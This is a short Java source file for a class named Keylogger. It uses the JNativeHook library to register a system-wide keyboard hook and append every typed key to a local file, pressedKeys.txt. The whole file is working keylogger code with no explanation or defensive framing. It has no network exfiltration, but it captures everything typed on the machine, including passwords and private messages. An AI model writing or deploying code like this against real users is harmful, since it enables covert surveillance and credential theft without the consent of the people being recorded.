package testpackage;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {

  private static final Path outputFile = Paths.get("pressedKeys.txt");

  public static void main(String [] args){

    try{
      GlobalScreen.registerNativeHook();
    } catch (NativeHookException exception){
      System.exit(-1);
    }
    GlobalScreen.addNativeKeyListener(new Keylogger());
  }

  @Override
  public void nativeKeyTyped(NativeKeyEvent keyEvent) {
    String keyText = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());

    try (OutputStream s = Files.newOutputStream(outputFile, StandardOpenOption.CREATE,
        StandardOpenOption.WRITE, StandardOpenOption.APPEND);
        PrintWriter writer = new PrintWriter(s)){
      if (keyText.length() > 1){
        writer.print("[" + keyText + "]");
      } else {
        writer.print(keyText);
      }
    } catch (IOException exception){
      System.exit(-1);
    }
  }

  @Override
  public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
    // skip
  }

  @Override
  public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    // skip
  }
}
